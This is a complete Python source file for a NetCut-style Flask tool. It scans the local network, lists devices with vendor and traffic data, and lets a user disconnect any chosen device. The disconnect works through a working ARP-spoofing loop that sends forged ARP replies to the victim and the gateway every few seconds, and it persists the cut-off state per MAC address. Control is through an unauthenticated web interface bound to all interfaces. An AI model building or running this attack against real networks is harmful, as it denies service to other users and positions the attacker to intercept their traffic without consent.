#!/usr/bin/env python3
import os, sys, json, time, signal, threading, socket, subprocess, re, urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from collections import defaultdict

import netifaces
from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP
from flask import Flask, jsonify, request, render_template

DATA_FILE = Path(__file__).parent / "devices.json"
app = Flask(__name__)

class Device:
    def __init__(self, ip, mac, hostname=None, vendor=None, custom_name=None):
        self.ip = ip; self.mac = mac
        self.hostname = hostname or "Unknown"; self.vendor = vendor or "Unknown"
        self.custom_name = custom_name or ""
        self.state = "Connected"
        self.spoof_stop = None; self.spoof_thread = None
        self.first_seen = time.time()
        self.last_seen = time.time()

    def to_dict(self):
        dn = (self.custom_name or
              self.vendor if self.vendor != "Unknown" else
              self.hostname if self.hostname != "Unknown" else
              self.ip)
        return {"ip": self.ip, "mac": self.mac, "hostname": self.hostname,
                "vendor": self.vendor, "custom_name": self.custom_name,
                "state": self.state, "display_name": dn,
                "first_seen": self.first_seen, "last_seen": self.last_seen}

class TrafficMonitor:
    def __init__(self):
        self.traffic = defaultdict(int)
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.thread = None

    def packet_handler(self, pkt):
        if IP in pkt:
            size = len(pkt)
            with self.lock:
                self.traffic[pkt[IP].src] += size
                self.traffic[pkt[IP].dst] += size

    def start(self, interface):
        self.traffic.clear(); self.stop_event.clear()
        self.thread = threading.Thread(target=self._run, args=(interface,), daemon=True)
        self.thread.start()

    def _run(self, interface):
        sniff(iface=interface, prn=self.packet_handler, store=0,
              stop_filter=lambda p: self.stop_event.is_set())

    def stop(self): self.stop_event.set()
    def get_traffic(self):
        with self.lock:
            return {ip: round(b/1024, 1) for ip, b in self.traffic.items()}

class NetCutController:
    def __init__(self):
        self.interface = None; self.ip = None; self._iface_idx = None
        self.gateway_ip = None; self.gateway_mac = None
        self.devices = []; self.saved_data = self.load_saved()
        self.scanning = False; self.scan_progress = 0
        self.traffic = TrafficMonitor()
        self.auto_scan_stop = threading.Event()
        self.auto_scan_thread = None
        self.our_mac = None

    def load_saved(self):
        if DATA_FILE.exists():
            try:
                with open(DATA_FILE) as f: return json.load(f)
            except: return {}
        return {}

    def save_device(self, mac, data):
        entry = self.saved_data.get(mac, {})
        entry.update(data)
        self.saved_data[mac] = entry
        with open(DATA_FILE, 'w') as f: json.dump(self.saved_data, f, indent=2)

    def get_vendor(self, mac):
        saved = self.saved_data.get(mac, {})
        if saved.get("vendor"):
            return saved["vendor"]
        try:
            req = urllib.request.Request(
                f"https://api.macvendors.com/{mac}",
                headers={'User-Agent': 'Python-urllib/3.0'})
            with urllib.request.urlopen(req, timeout=3) as r:
                vendor = r.read().decode().strip()
                if vendor:
                    self.save_device(mac, {"vendor": vendor})
                    return vendor
        except: pass
        return None

    def discover_interfaces(self):
        if os.name == 'nt':
            from scapy.arch.windows import get_windows_if_list
            iface_list = get_windows_if_list()
        else: iface_list = []
        available = []
        if os.name == 'nt':
            for iface in iface_list:
                name = iface.get('name', '')
                ips = [ip for ip in iface.get('ips', []) if '.' in ip and not ip.startswith('169.254')]
                desc = iface.get('description', '')
                if ips and name and not any(x in desc for x in ['WAN Miniport', 'Kernel Debug', 'VPN', 'Loopback', 'Teredo', '6to4', 'IP-HTTPS']):
                    available.append((name, ips[0], desc, iface.get('index')))
        else:
            for i in netifaces.interfaces():
                if i == 'lo': continue
                addrs = netifaces.ifaddresses(i)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    if not ip.startswith('169.254'): available.append((i, ip, i, None))
        if not available: return None, "No usable interfaces."
        gateways = netifaces.gateways()
        gw = gateways['default'][netifaces.AF_INET][0] if 'default' in gateways and netifaces.AF_INET in gateways['default'] else None
        sel = None
        if gw: sel = next((x for x in available if x[1] == gw), None)
        if not sel and gw:
            pfx = '.'.join(gw.split('.')[:3])
            sel = next((x for x in available if x[1].startswith(pfx)), None)
        if not sel: sel = next((x for x in available if 'Ethernet' in x[0] or 'Wi-Fi' in x[0] or 'eth' in x[0]), None)
        if not sel: sel = available[0]
        self.interface, self.ip, _, self._iface_idx = sel
        self.our_mac = get_if_hwaddr(self.interface)
        if not gw: return None, "No default gateway."
        self.gateway_ip = gw
        return True, None

    def get_device_info(self, ip, mac):
        hostname = None
        try:
            hn = socket.gethostbyaddr(ip); hostname = hn[0]
        except: pass
        vendor = self.get_vendor(mac)
        return hostname, vendor

    def arp_scan(self, passes=3):
        conf.verb = 0
        target = self.gateway_ip.rsplit('.', 1)[0] + ".1/24"
        req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target)
        result = {}
        for _ in range(passes):
            try:
                ans, _ = srp(req, timeout=3, retry=1, verbose=False)
            except Exception:
                continue
            for s, r in ans:
                ip, mac = r.psrc, r.hwsrc
                if ip == self.ip or mac == self.our_mac:
                    continue
                if mac not in result:
                    result[mac] = ip
                if ip == self.gateway_ip:
                    self.gateway_mac = mac
        return result

    def scan_network(self):
        self.scanning = True; self.scan_progress = 0
        for d in self.devices:
            if d.spoof_stop: d.spoof_stop.set()
            d.spoof_stop = None; d.spoof_thread = None

        self.scan_progress = 10
        found = self.arp_scan(passes=3)
        self.scan_progress = 60
        self.merge_scan_results(found)
        for d in self.devices:
            if d.state == "Disconnected":
                self._start_spoof(d)
        self.devices.sort(key=lambda x: x.ip)
        self.scan_progress = 100
        self.traffic.stop(); self.traffic.start(self.interface)
        self.scanning = False
        return self.devices

    def merge_scan_results(self, found):
        now = time.time()
        by_mac = {d.mac: d for d in self.devices}
        new_macs = [mac for mac in found if mac not in by_mac]

        if new_macs:
            resolved = {}
            with ThreadPoolExecutor(max_workers=4) as ex:
                futures = {mac: ex.submit(self.get_device_info, found[mac], mac) for mac in new_macs}
                for mac, fut in futures.items():
                    try:
                        resolved[mac] = fut.result()
                    except Exception:
                        resolved[mac] = (None, None)
            for mac in new_macs:
                hostname, vendor = resolved.get(mac, (None, None))
                saved = self.saved_data.get(mac, {})
                dev = Device(found[mac], mac, hostname, vendor, saved.get("custom_name", ""))
                if found[mac] == self.gateway_ip:
                    dev.state = "Router (Connected)"
                    self.gateway_mac = mac
                elif saved.get("state") == "Disconnected":
                    dev.state = "Disconnected"
                self.devices.append(dev)
                if dev.state == "Disconnected":
                    self._start_spoof(dev)

        for mac, ip in found.items():
            dev = by_mac.get(mac)
            if not dev:
                continue
            dev.ip = ip
            dev.last_seen = now
            if dev.state == "Offline":
                dev.state = "Connected"
            if dev.state == "Disconnected":
                self._start_spoof(dev)

        for d in self.devices:
            if d.mac in found or d.ip == self.gateway_ip:
                continue
            if d.state != "Disconnected":
                d.state = "Offline"

    def _start_spoof(self, dev):
        if dev.spoof_stop: return
        dev.spoof_stop = threading.Event()
        dev.spoof_thread = threading.Thread(target=self._spoof_loop, args=(dev,), daemon=True)
        dev.spoof_thread.start()

    def _stop_spoof(self, dev):
        if dev.spoof_stop: dev.spoof_stop.set()
        dev.spoof_stop = None; dev.spoof_thread = None

    def _spoof_loop(self, dev):
        protect = Ether(dst=self.our_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.our_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        p1 = Ether(dst=dev.mac) / ARP(op=2, pdst=dev.ip, hwdst=dev.mac, psrc=self.gateway_ip, hwsrc=self.our_mac)
        p2 = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=dev.ip, hwsrc=self.our_mac)
        while dev.spoof_stop and not dev.spoof_stop.is_set():
            sendp(p1, iface=self.interface, verbose=False)
            sendp(p2, iface=self.interface, verbose=False)
            sendp(protect, iface=self.interface, verbose=False)
            time.sleep(2.5)

    def _restore(self, dev):
        p1 = Ether(dst=dev.mac) / ARP(op=2, pdst=dev.ip, hwdst=dev.mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        p2 = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=dev.ip, hwsrc=dev.mac)
        sendp(p1, count=5, iface=self.interface, verbose=False)
        sendp(p2, count=5, iface=self.interface, verbose=False)

    def toggle_device(self, mac):
        for d in self.devices:
            if d.mac == mac:
                if d.ip == self.gateway_ip: return False, "Cannot touch gateway."
                if d.mac == self.our_mac: return False, "Cannot touch your own device."
                if d.state == "Connected":
                    d.state = "Disconnected"
                    self._start_spoof(d)
                    self.save_device(mac, {"state": "Disconnected"})
                    return True, "Disconnected"
                else:
                    self._stop_spoof(d)
                    self._restore(d)
                    d.state = "Connected"
                    self.save_device(mac, {"state": "Connected"})
                    return True, "Connected"
        return False, "Not found."

    def rename_device(self, mac, name):
        for d in self.devices:
            if d.mac == mac:
                d.custom_name = name
                self.save_device(mac, {"custom_name": name})
                return True
        return False

    def restore_all(self):
        self.traffic.stop()
        if self.auto_scan_thread: self.auto_scan_stop.set()
        for d in self.devices:
            self._stop_spoof(d); self._restore(d)
            d.state = "Connected"

    def auto_scan_loop(self):
        while not self.auto_scan_stop.is_set():
            time.sleep(8)
            if self.auto_scan_stop.is_set(): break
            try:
                if self.scanning: continue
                found = self.arp_scan(passes=2)
                self.merge_scan_results(found)
                self.devices.sort(key=lambda x: x.ip)
            except Exception:
                pass

    def start_auto_scan(self):
        self.auto_scan_stop.clear()
        self.auto_scan_thread = threading.Thread(target=self.auto_scan_loop, daemon=True)
        self.auto_scan_thread.start()

controller = NetCutController()

@app.route('/')
def index(): return render_template('index.html')

@app.route('/api/devices')
def get_devices():
    t = controller.traffic.get_traffic()
    return jsonify([{**d.to_dict(), "traffic_kb": t.get(d.ip, 0)} for d in controller.devices])

@app.route('/api/info')
def get_info():
    return jsonify({"ip": controller.ip, "gateway": controller.gateway_ip,
        "interface": controller.interface, "scanning": controller.scanning,
        "scan_progress": controller.scan_progress})

@app.route('/api/scan', methods=['POST'])
def scan():
    threading.Thread(target=controller.scan_network, daemon=True).start()
    return jsonify({"status": "started"})

@app.route('/api/toggle', methods=['POST'])
def toggle():
    data = request.get_json()
    ok, s = controller.toggle_device(data['mac'])
    return jsonify({"success": ok, "state": s})

@app.route('/api/rename', methods=['POST'])
def rename():
    data = request.get_json()
    ok = controller.rename_device(data['mac'], data['name'])
    return jsonify({"success": ok})

@app.route('/api/restore_all', methods=['POST'])
def restore_all():
    controller.restore_all(); return jsonify({"status": "ok"})

def cleanup():
    print("\nRestoring all..."); controller.restore_all()

if __name__ == '__main__':
    import ctypes
    if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        print("Run as Administrator."); sys.exit(1)
    elif os.name == 'posix' and os.geteuid() != 0:
        print("Run as root."); sys.exit(1)
    success, err = controller.discover_interfaces()
    if not success: print(f"Error: {err}"); sys.exit(1)
    print(f"Interface: {controller.interface} ({controller.ip})")
    print(f"Gateway: {controller.gateway_ip}")
    print("Scanning...")
    controller.scan_network()
    controller.start_auto_scan()
    print(f"Found {len(controller.devices)} device(s). Web UI: http://0.0.0.0:5000")
    signal.signal(signal.SIGINT, lambda s, f: (cleanup(), os._exit(0)))
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
